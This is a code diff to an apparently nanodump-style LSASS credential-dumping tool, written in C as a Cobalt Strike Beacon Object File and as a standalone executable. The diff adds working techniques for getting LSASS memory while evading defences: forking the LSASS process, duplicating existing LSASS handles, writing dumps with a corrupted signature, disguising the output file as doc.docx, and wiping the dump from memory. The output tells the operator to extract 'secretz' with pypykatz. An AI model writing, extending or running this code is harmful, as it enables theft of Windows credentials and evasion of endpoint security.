@@ -15,7 +15,7 @@ void writeat(
     unsigned size
 )
 {
-    void* dst = (void*)(((ULONGSIZE)(dc->BaseAddress)) + rva);
+    void* dst = (void*)((ULONG_PTR)dc->BaseAddress + rva);
     MSVCRT$memcpy(dst, data, size);
 }
 
@@ -32,7 +32,7 @@ void append(
 #else
         printf(
 #endif
-            "The dump is too big. Increase DUMP_MAX_SIZE.\n"
+            "The dump is too big, please increase DUMP_MAX_SIZE.\n"
         );
     }
     else
@@ -337,7 +337,7 @@ BOOL enable_debug_priv(void)
     return TRUE;
 }
 
-HANDLE get_process_handle(
+HANDLE fork_lsass_process(
     DWORD dwPid
 )
 {
@@ -357,12 +357,16 @@ HANDLE get_process_handle(
     uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
     uPid.UniqueThread = (HANDLE)0;
 
+    // no PROCESS_VM_READ :)
+    DWORD dwFlags = PROCESS_CREATE_PROCESS;
+
     status = NtOpenProcess(
         &hProcess,
-        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+        dwFlags,
         &ObjectAttributes,
         &uPid
     );
+
     if (status == STATUS_INVALID_CID)
     {
 #ifdef BOF
@@ -400,6 +404,121 @@ HANDLE get_process_handle(
         return NULL;
     }
 
+    // fork the LSASS process
+    HANDLE hCloneProcess = NULL;
+    OBJECT_ATTRIBUTES CloneObjectAttributes;
+
+    InitializeObjectAttributes(
+        &CloneObjectAttributes,
+        NULL,
+        OBJ_CASE_INSENSITIVE,
+        NULL,
+        NULL
+    );
+
+    status = NtCreateProcess(
+        &hCloneProcess,
+        GENERIC_ALL,
+        &CloneObjectAttributes,
+        hProcess,
+        TRUE,
+        NULL,
+        NULL,
+        NULL
+    );
+
+    NtClose(hProcess); hProcess = NULL;
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call NtCreateProcess, status: 0x%lx\n",
+            status
+        );
+        return NULL;
+    }
+
+    return hCloneProcess;
+}
+
+HANDLE get_process_handle(
+    DWORD dwPid,
+    DWORD dwFlags,
+    BOOL quiet
+)
+{
+    NTSTATUS status;
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES ObjectAttributes;
+
+    InitializeObjectAttributes(
+        &ObjectAttributes,
+        NULL,
+        0,
+        NULL,
+        NULL
+    );
+    CLIENT_ID uPid = { 0 };
+
+    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
+    uPid.UniqueThread = (HANDLE)0;
+
+    status = NtOpenProcess(
+        &hProcess,
+        dwFlags,
+        &ObjectAttributes,
+        &uPid
+    );
+
+    if (status == STATUS_INVALID_CID)
+    {
+        if (!quiet)
+        {
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "There is no process with the PID %ld.\n",
+                dwPid
+            );
+        }
+        return NULL;
+    }
+    if (status == STATUS_ACCESS_DENIED)
+    {
+        if (!quiet)
+        {
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "Could not open a handle to %ld\n",
+                dwPid
+            );
+        }
+        return NULL;
+    }
+    else if (!NT_SUCCESS(status))
+    {
+        if (!quiet)
+        {
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "Failed to call NtOpenProcess, status: 0x%lx\n",
+                status
+            );
+        }
+        return NULL;
+    }
+
     return hProcess;
 }
 
@@ -407,7 +526,10 @@ ULONG32 convert_to_little_endian(
     ULONG32 number
 )
 {
-    return ((number & 0xff000000) >> 3*8) | ((number & 0x00ff0000) >> 8) | ((number & 0x0000ff00) << 8) | ((number & 0x000000ff) << 3*8);
+    return  ((number & 0xff000000) >> 0x18) |
+            ((number & 0x00ff0000) >> 0x08) |
+            ((number & 0x0000ff00) << 0x08) |
+            ((number & 0x000000ff) << 0x18);
 }
 
 void write_header(
@@ -884,7 +1006,7 @@ struct module_info* write_module_list_stream(
     while (curr_module)
     {
         struct MiniDumpModule module;
-        module.BaseOfImage = (ULONGSIZE)curr_module->dll_base;
+        module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
         module.SizeOfImage = curr_module->size_of_image;
         module.CheckSum = 0;
         module.TimeDateStamp = 0;
@@ -977,15 +1099,15 @@ void free_linked_list(
 }
 
 BOOL is_important_module(
-    ULONGSIZE address,
+    PVOID address,
     struct module_info* module_list
 )
 {
     struct module_info* curr_module = module_list;
     while (curr_module)
     {
-        if (address >= (ULONGSIZE)curr_module->dll_base &&
-            address < (ULONGSIZE)curr_module->dll_base + curr_module->size_of_image)
+        if ((ULONG_PTR)address >= (ULONG_PTR)curr_module->dll_base &&
+            (ULONG_PTR)address < (ULONG_PTR)curr_module->dll_base + curr_module->size_of_image)
             return TRUE;
         curr_module = curr_module->next;
     }
@@ -1022,28 +1144,22 @@ struct MiniDumpMemoryDescriptor64* get_memory_ranges(
         // next memory range
         current_address = base_address + region_size;
 
-        ULONG32 mem_commit = 0x1000;
-        ULONG32 mem_image = 0x1000000;
-        ULONG32 mem_mapped = 0x40000;
-        ULONG32 no_access = 0x001;
-        ULONG32 guard = 0x100;
-
         // ignore non-commited pages
-        if (mbi.State != mem_commit)
+        if (mbi.State != MEM_COMMIT)
             continue;
-        // ignore pages with no permissions
-        if (mbi.Protect == no_access)
+        // ignore pages with PAGE_NOACCESS
+        if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
             continue;
         // ignore mapped pages
-        if (mbi.Type == mem_mapped)
+        if (mbi.Type == MEM_MAPPED)
             continue;
         // ignore pages with PAGE_GUARD as they can't be read
-        if ((guard & mbi.Protect) == guard)
+        if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD)
             continue;
         // ignore modules that are not relevant to mimikatz
-        if (mbi.Type == mem_image &&
+        if (mbi.Type == MEM_IMAGE &&
             !is_important_module(
-                (ULONGSIZE)base_address,
+                base_address,
                 module_list))
             continue;
 
@@ -1061,7 +1177,7 @@ struct MiniDumpMemoryDescriptor64* get_memory_ranges(
             return NULL;
         }
         new_range->next = NULL;
-        new_range->StartOfMemoryRange = (ULONGSIZE)base_address;
+        new_range->StartOfMemoryRange = (ULONG_PTR)base_address;
         new_range->DataSize = region_size;
 
         if (!ranges_list)
@@ -1140,7 +1256,7 @@ struct MiniDumpMemoryDescriptor64* write_memory64_list_stream(
         }
         NTSTATUS status = NtReadVirtualMemory(
             dc->hProcess,
-            (PVOID)(ULONGSIZE)curr_range->StartOfMemoryRange,
+            (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
             buffer,
             curr_range->DataSize,
             NULL
@@ -1193,6 +1309,24 @@ BOOL NanoDumpWriteDump(
     return TRUE;
 }
 
+BOOL is_lsass(HANDLE hProcess)
+{
+    // if the process has 'lsass.exe' loaded, then we found LSASS
+    wchar_t* module_name[] = { L"lsass.exe" };
+    struct module_info* module_list = find_modules(
+        hProcess,
+        module_name,
+        ARRAY_SIZE(module_name),
+        FALSE
+    );
+    if (module_list)
+    {
+        free_linked_list(module_list); module_list = NULL;
+        return TRUE;
+    }
+    return FALSE;
+}
+
 HANDLE find_lsass(void)
 {
     // loop over each process
@@ -1229,21 +1363,351 @@ HANDLE find_lsass(void)
             );
             return NULL;
         }
-
-        // if the process has 'lsass.exe' loaded, then we found LSASS
-        wchar_t* module_name[] = { L"lsass.exe" };
-        struct module_info* module_list = find_modules(
-            hProcess,
-            module_name,
-            ARRAY_SIZE(module_name),
-            FALSE
-        );
-        if (module_list)
-        {
-            free_linked_list(module_list); module_list = NULL;
+        if (is_lsass(hProcess))
             return hProcess;
+    }
+}
+
+PVOID allocate_memory(SIZE_T* RegionSize)
+{
+    PVOID BaseAddress = NULL;
+    NTSTATUS status = NtAllocateVirtualMemory(
+        NtCurrentProcess(),
+        &BaseAddress,
+        0,
+        RegionSize,
+        MEM_COMMIT,
+        PAGE_READWRITE
+    );
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Could not allocate enough memory to write the dump\n"
+        );
+        return NULL;
+    }
+    return BaseAddress;
+}
+
+void erase_dump_from_memory(PVOID BaseAddress, SIZE_T RegionSize)
+{
+    // delete all trace of the dump from memory
+    MSVCRT$memset(BaseAddress, 0, RegionSize);
+    // free the memory area where the dump was
+    NTSTATUS status = NtFreeVirtualMemory(
+        NtCurrentProcess(),
+        &BaseAddress,
+        &RegionSize,
+        MEM_RELEASE
+    );
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
+            status
+        );
+    }
+}
+
+void generate_invalid_sig(char* signature)
+{
+    time_t t;
+    MSVCRT$srand((unsigned) MSVCRT$time(&t));
+    signature[0] = 'P';
+    signature[1] = 'M';
+    signature[2] = 'D';
+    signature[3] = 'M';
+    while (!MSVCRT$strncmp(signature, "PMDM", 4))
+    {
+        signature[0] = MSVCRT$rand() & 0xFF;
+        signature[1] = MSVCRT$rand() & 0xFF;
+        signature[2] = MSVCRT$rand() & 0xFF;
+        signature[3] = MSVCRT$rand() & 0xFF;
+    }
+}
+
+BOOL is_process_handle(
+    HANDLE handle
+)
+{
+    BOOL is_process = FALSE;
+    ULONG size = 0x1000;
+    POBJECT_TYPE_INFORMATION ObjectInformation = (POBJECT_TYPE_INFORMATION)intAlloc(size);
+    if (!ObjectInformation)
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
+            size,
+            KERNEL32$GetLastError()
+        );
+        return FALSE;
+    }
+
+    NTSTATUS status = NtQueryObject(
+        handle,
+        ObjectTypeInformation,
+        ObjectInformation,
+        size,
+        NULL
+    );
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call NtQueryObject, status: 0x%lx\n",
+            status
+        );
+        return FALSE;
+    }
+    if (!MSVCRT$_wcsicmp(ObjectInformation->TypeName.Buffer, L"Process"))
+        is_process = TRUE;
+    intFree(ObjectInformation); ObjectInformation = NULL;
+    return is_process;
+}
+
+PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
+{
+    NTSTATUS status;
+    ULONG initial_size = 0x200000;
+    ULONG buffer_size = initial_size;
+    ULONG actual_buffer_size;
+    ULONG increase_step = 0x10000;
+    PVOID handleTableInformation = intAlloc(buffer_size);
+    if (!handleTableInformation)
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
+            buffer_size,
+            KERNEL32$GetLastError()
+        );
+        return NULL;
+    }
+    while (TRUE)
+    {
+        //get information of all the existing handles
+        status = NtQuerySystemInformation(
+            SystemHandleInformation,
+            handleTableInformation,
+            buffer_size,
+            &actual_buffer_size
+        );
+        if (status == STATUS_INFO_LENGTH_MISMATCH)
+        {
+            // increase the size of the buffer to fit all the handles
+            intFree(handleTableInformation); handleTableInformation = NULL;
+            buffer_size += increase_step;
+            if (buffer_size < initial_size)
+            {
+                // an integer overflow is extremely unlikely, but just in case...
+#ifdef BOF
+                BeaconPrintf(CALLBACK_ERROR,
+#else
+                printf(
+#endif
+                    "Cannot increase buffer_size any more\n"
+                );
+                return NULL;
+            }
+            handleTableInformation = intAlloc(buffer_size);
+            if (!handleTableInformation)
+            {
+#ifdef BOF
+                BeaconPrintf(CALLBACK_ERROR,
+#else
+                printf(
+#endif
+                    "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
+                    buffer_size,
+                    KERNEL32$GetLastError()
+                );
+                return NULL;
+            }
+            continue;
+        }
+        if (!NT_SUCCESS(status))
+        {
+            intFree(handleTableInformation); handleTableInformation = NULL;
+#ifdef BOF
+            BeaconPrintf(CALLBACK_ERROR,
+#else
+            printf(
+#endif
+                "Failed to call NtQuerySystemInformation, status: 0x%lx\n",
+                status
+            );
+            return NULL;
+        }
+        return handleTableInformation;
+    }
+}
+
+BOOL process_is_included(
+    PPROCESS_LIST process_list,
+    ULONG ProcessId
+)
+{
+    for (ULONG i = 0; i < process_list->Count; i++)
+    {
+        if (process_list->ProcessId[i] == ProcessId)
+            return TRUE;
+    }
+    return FALSE;
+}
+
+PPROCESS_LIST get_processest_from_handle_table(
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation
+)
+{
+    PPROCESS_LIST process_list = (PPROCESS_LIST)intAlloc(sizeof(PROCESS_LIST));
+    if (!process_list)
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
+            (ULONG32)sizeof(PROCESS_LIST),
+            KERNEL32$GetLastError()
+        );
+        return NULL;
+    }
+
+    for (ULONG i = 0; i < handleTableInformation->Count; i++)
+    {
+        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];
+
+        if (!process_is_included(process_list, handleInfo->ProcessId))
+        {
+            process_list->ProcessId[process_list->Count++] = handleInfo->ProcessId;
+            if (process_list->Count == MAX_PROCESSES)
+            {
+#ifdef BOF
+                BeaconPrintf(CALLBACK_ERROR,
+#else
+                printf(
+#endif
+                    "Too many processes, please increase MAX_PROCESSES\n"
+                );
+                break;
+            }
         }
     }
+    return process_list;
+}
+
+HANDLE duplicate_lsass_handle(
+    DWORD dwPid
+)
+{
+    NTSTATUS status;
+
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
+    if (!handleTableInformation)
+        return NULL;
+
+    PPROCESS_LIST process_list = get_processest_from_handle_table(handleTableInformation);
+    if (!process_list)
+        return NULL;
+
+    for (ULONG i = 0; i < process_list->Count; i++)
+    {
+        ULONG ProcessId = process_list->ProcessId[i];
+
+        if (ProcessId == dwPid)
+            continue;
+        if (ProcessId == 4)
+            continue;
+
+        // open a handle to the process with PROCESS_DUP_HANDLE
+        HANDLE hProcess = get_process_handle(
+            ProcessId,
+            PROCESS_DUP_HANDLE,
+            TRUE
+        );
+        if (!hProcess)
+            continue;
+
+        // this isn't super efficient but whatever
+        for (ULONG j = 0; j < handleTableInformation->Count; j++)
+        {
+            PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
+
+            if (handleInfo->ProcessId != ProcessId)
+                continue;
+
+            // duplicate the handle
+            HANDLE hDuped;
+            status = NtDuplicateObject(
+                hProcess,
+                (HANDLE)(DWORD_PTR)handleInfo->Handle,
+                NtCurrentProcess(),
+                &hDuped,
+                PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
+                0,
+                0
+            );
+            if (!NT_SUCCESS(status))
+                continue;
+
+            if (!is_process_handle(hDuped))
+            {
+                NtClose(hDuped); hDuped = NULL;
+                continue;
+            }
+
+            if (is_lsass(hDuped))
+            {
+                // found LSASS handle
+#ifdef BOF
+                BeaconPrintf(CALLBACK_OUTPUT,
+#else
+                printf(
+#endif
+                    "Found LSASS handle: 0x%x, on process: %ld\n",
+                    handleInfo->Handle,
+                    handleInfo->ProcessId
+                );
+                intFree(handleTableInformation); handleTableInformation = NULL;
+                intFree(process_list); process_list = NULL;
+                NtClose(hProcess); hProcess = NULL;
+                return hDuped;
+            }
+            NtClose(hDuped); hDuped = NULL;
+        }
+        NtClose(hProcess); hProcess = NULL;
+    }
+
+#ifdef BOF
+    BeaconPrintf(CALLBACK_ERROR,
+#else
+    printf(
+#endif
+        "No handle to the LSASS process was found\n"
+    );
+
+    intFree(handleTableInformation); handleTableInformation = NULL;
+    intFree(process_list); process_list = NULL;
+    return NULL;
 }
 
 void encrypt_dump(
@@ -1261,15 +1725,19 @@ void go(char* args, int length)
     datap  parser;
     int    pid;
     char*  dump_name;
-    int    do_write;
-    char*  signature;
+    BOOL   do_write;
+    BOOL   fork;
+    BOOL   dup;
+    BOOL   use_valid_sig;
     BOOL   success;
 
     BeaconDataParse(&parser, args, length);
     pid = BeaconDataInt(&parser);
     dump_name = BeaconDataExtract(&parser, NULL);
-    do_write = BeaconDataInt(&parser);
-    signature = BeaconDataExtract(&parser, NULL);
+    do_write = (BOOL)BeaconDataInt(&parser);
+    use_valid_sig = (BOOL)BeaconDataInt(&parser);
+    fork = (BOOL)BeaconDataInt(&parser);
+    dup = (BOOL)BeaconDataInt(&parser);
 
 #ifndef _WIN64
     if(IsWoW64())
@@ -1292,6 +1760,47 @@ void go(char* args, int length)
         return;
     }
 
+    if (fork && dup)
+    {
+        BeaconPrintf(
+            CALLBACK_ERROR,
+            "Cannot set both --fork and --dup"
+        );
+        return;
+    }
+
+    if (fork && !pid)
+    {
+        BeaconPrintf(
+            CALLBACK_ERROR,
+            "Process forking requires a PID"
+        );
+        return;
+    }
+
+    if (dup && !pid)
+    {
+        BeaconPrintf(
+            CALLBACK_ERROR,
+            "Handle duplication requires a PID"
+        );
+        return;
+    }
+
+    // set the signature
+    char signature[4];
+    if (use_valid_sig)
+    {
+        signature[0] = 'P';
+        signature[1] = 'M';
+        signature[2] = 'D';
+        signature[3] = 'M';
+    }
+    else
+    {
+        generate_invalid_sig(signature);
+    }
+
     success = enable_debug_priv();
     if (!success)
     {
@@ -1302,31 +1811,41 @@ void go(char* args, int length)
     }
 
     HANDLE hProcess;
+
     if (pid)
-        hProcess = get_process_handle(pid);
+    {
+        if (fork)
+        {
+            hProcess = fork_lsass_process(
+                pid
+            );
+        }
+        else if (dup)
+        {
+            hProcess = duplicate_lsass_handle(
+                pid
+            );
+        }
+        else
+        {
+            hProcess = get_process_handle(
+                pid,
+                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+                FALSE
+            );
+        }
+    }
     else
         hProcess = find_lsass();
     if (!hProcess)
         return;
 
     // allocate a chuck of memory to write the dump
-    void* BaseAddress = NULL;
     SIZE_T RegionSize = DUMP_MAX_SIZE;
-    NTSTATUS status = NtAllocateVirtualMemory(
-        NtCurrentProcess(),
-        &BaseAddress,
-        0,
-        &RegionSize,
-        MEM_COMMIT,
-        PAGE_READWRITE
-    );
-    if (!NT_SUCCESS(status))
+    PVOID BaseAddress = allocate_memory(&RegionSize);
+    if (!BaseAddress)
     {
         NtClose(hProcess); hProcess = NULL;
-        BeaconPrintf(
-            CALLBACK_ERROR,
-            "Could not allocate enough memory to write the dump"
-        );
         return;
     }
 
@@ -1343,7 +1862,7 @@ void go(char* args, int length)
 
     if (success)
     {
-        if (do_write == 1)
+        if (do_write)
         {
             success = write_file(
                 dump_name,
@@ -1361,23 +1880,7 @@ void go(char* args, int length)
         }
     }
 
-    // delete all trace of the dump from memory
-    MSVCRT$memset(BaseAddress, 0, dc.rva);
-    // free the memory area where the dump was
-    status = NtFreeVirtualMemory(
-        NtCurrentProcess(),
-        &BaseAddress,
-        &RegionSize,
-        MEM_RELEASE
-    );
-    if (!NT_SUCCESS(status))
-    {
-        BeaconPrintf(
-            CALLBACK_ERROR,
-            "Failed to call NtFreeVirtualMemory, status: 0x%lx",
-            status
-        );
-    }
+    erase_dump_from_memory(BaseAddress, RegionSize);
 
     // close the handle
     NtClose(hProcess); hProcess = NULL;
@@ -1416,37 +1919,26 @@ void go(char* args, int length)
 
 void usage(char* procname)
 {
-    printf("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--pid 1234] [--help]\n", procname);
+    printf("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--dup] [--pid 1234] [--help]\n", procname);
     printf("    --write PATH, -w PATH\n");
     printf("            full path to the dumpfile\n");
     printf("    --valid, -v\n");
     printf("            create a dump with a valid signature (optional)\n");
+    printf("    --fork, -f\n");
+    printf("            fork target process before dumping (optional)\n");
+    printf("    --dup, -d\n");
+    printf("            duplicate an existing LSASS handle (optional)\n");
     printf("    --pid PID, -p PID\n");
-    printf("            the PID of LSASS (optional)\n");
+    printf("            the PID of LSASS (required if --fork or --dup are used)\n");
     printf("    --help, -h\n");
     printf("            print this help message and leave");
-}
-
-void get_invalid_sig(char* signature)
-{
-    time_t t;
-    srand((unsigned) time(&t));
-    signature[0] = 'P';
-    signature[1] = 'M';
-    signature[2] = 'D';
-    signature[3] = 'M';
-    while (!strncmp(signature, "PMDM", 4))
-    {
-        signature[0] = rand() & 0xFF;
-        signature[1] = rand() & 0xFF;
-        signature[2] = rand() & 0xFF;
-        signature[3] = rand() & 0xFF;
-    }
 }
 
 int main(int argc, char* argv[])
 {
     int pid = 0;
+    BOOL fork = FALSE;
+    BOOL dup = FALSE;
     char* dump_name = NULL;
     char signature[4];
     BOOL success;
@@ -1461,8 +1953,8 @@ int main(int argc, char* argv[])
     }
 #endif
 
-    // generate a random signature
-    get_invalid_sig(signature);
+    // by default, set an invalid signature
+    generate_invalid_sig(signature);
 
     for (int i = 1; i < argc; ++i)
     {
@@ -1484,6 +1976,16 @@ int main(int argc, char* argv[])
         {
             pid = atoi(argv[++i]);
         }
+        else if (!strncmp(argv[i], "-f", 3) ||
+                 !strncmp(argv[i], "--fork", 7))
+        {
+            fork = TRUE;
+        }
+        else if (!strncmp(argv[i], "-d", 3) ||
+                 !strncmp(argv[i], "--dup", 6))
+        {
+            dup = TRUE;
+        }
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
         {
@@ -1499,13 +2001,32 @@ int main(int argc, char* argv[])
 
     if (!dump_name)
     {
+        printf("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx\n\n");
         usage(argv[0]);
         return -1;
     }
 
     if (!strrchr(dump_name, '\\'))
     {
-        printf("You must provide a full path: %s", dump_name);
+        printf("You must provide a full path: %s\n", dump_name);
+        return -1;
+    }
+
+    if (dup && fork)
+    {
+        printf("Can't set both --dup and --fork\n");
+        return -1;
+    }
+
+    if (fork && !pid)
+    {
+        printf("Process forking requires a PID\n");
+        return -1;
+    }
+
+    if (dup && !pid)
+    {
+        printf("Handle duplication requires a PID\n");
         return -1;
     }
 
@@ -1519,29 +2040,39 @@ int main(int argc, char* argv[])
 
     HANDLE hProcess;
     if (pid)
-        hProcess = get_process_handle(pid);
+    {
+        if (fork)
+        {
+            hProcess = fork_lsass_process(
+                pid
+            );
+        }
+        else if (dup)
+        {
+            hProcess = duplicate_lsass_handle(
+                pid
+            );
+        }
+        else
+        {
+            hProcess = get_process_handle(
+                pid,
+                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+                FALSE
+            );
+        }
+    }
     else
         hProcess = find_lsass();
     if (!hProcess)
         return -1;
 
     // allocate a chuck of memory to write the dump
-    void* BaseAddress = NULL;
     SIZE_T RegionSize = DUMP_MAX_SIZE;
-    NTSTATUS status = NtAllocateVirtualMemory(
-        NtCurrentProcess(),
-        &BaseAddress,
-        0,
-        &RegionSize,
-        MEM_COMMIT,
-        PAGE_READWRITE
-    );
-    if (!NT_SUCCESS(status))
+    PVOID BaseAddress = allocate_memory(&RegionSize);
+    if (!BaseAddress)
     {
         NtClose(hProcess); hProcess = NULL;
-        printf(
-            "Could not allocate enough memory to write the dump"
-        );
         return -1;
     }
 
@@ -1565,22 +2096,7 @@ int main(int argc, char* argv[])
         );
     }
 
-    // delete all trace of the dump from memory
-    MSVCRT$memset(BaseAddress, 0, dc.rva);
-    // free the memory area where the dump was
-    status = NtFreeVirtualMemory(
-        NtCurrentProcess(),
-        &BaseAddress,
-        &RegionSize,
-        MEM_RELEASE
-    );
-    if (!NT_SUCCESS(status))
-    {
-        printf(
-            "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
-            status
-        );
-    }
+    erase_dump_from_memory(BaseAddress, RegionSize);
 
     // close the handle
     NtClose(hProcess); hProcess = NULL;
@@ -1598,8 +2114,12 @@ int main(int argc, char* argv[])
             "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\n",
             &MSVCRT$strrchr(dump_name, '\\')[1]
         );
+        return 0;
     }
-    return 0;
+    else
+    {
+        return -1;
+    }
 }
 
 #endif
